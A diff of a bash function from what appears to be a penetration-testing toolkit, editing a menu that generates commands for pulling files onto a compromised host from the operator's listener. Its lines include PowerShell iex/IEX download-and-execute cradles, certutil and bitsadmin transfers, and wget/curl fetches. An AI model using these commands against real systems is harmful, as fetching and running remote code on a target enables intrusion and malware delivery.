@@ -87,13 +87,14 @@ nb-srv-file-download() {
 
     __ask "Choose a command to copy:"
     echo "1.  Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
-    echo "2.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-    echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\<FILE_NAME>"
-    echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "5.  curl http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "6.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\<FILE_NAME>"
-    echo "7.  IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')"
-    echo "8.  Previous menu"
+    echo "2.  powershell \"(new-object System.Net.WebClient).Downloadfile('http://${__LHOST}:${__LPORT}/$filename', '$filename')\""
+    echo "3.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+    echo "4.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+    echo "5.  wget http://${__LHOST}:${__LPORT}/$filename --output-file $filename"
+    echo "6.  curl http://${__LHOST}:${__LPORT}/$filename -O $filename"
+    echo "7.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename"
+    echo "8.  IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
+    echo "9.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
@@ -106,13 +107,14 @@ nb-srv-file-download() {
 
     case $choice in
         1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
-        2) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
-        3) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-        4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        5) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        6) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
-        7) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')";;
-        8) exit;;
+        2) __COMMAND="powershell \"(new-object System.Net.WebClient).Downloadfile('http://${__LHOST}:${__LPORT}/$filename', '$filename')\"";;
+        3) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+        4) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
+        5) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename --output-file $filename";;
+        6) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename -O $filename";;
+        7) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
+        8) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
+        9) exit;;
         *) echo "Invalid option";;
     esac
 
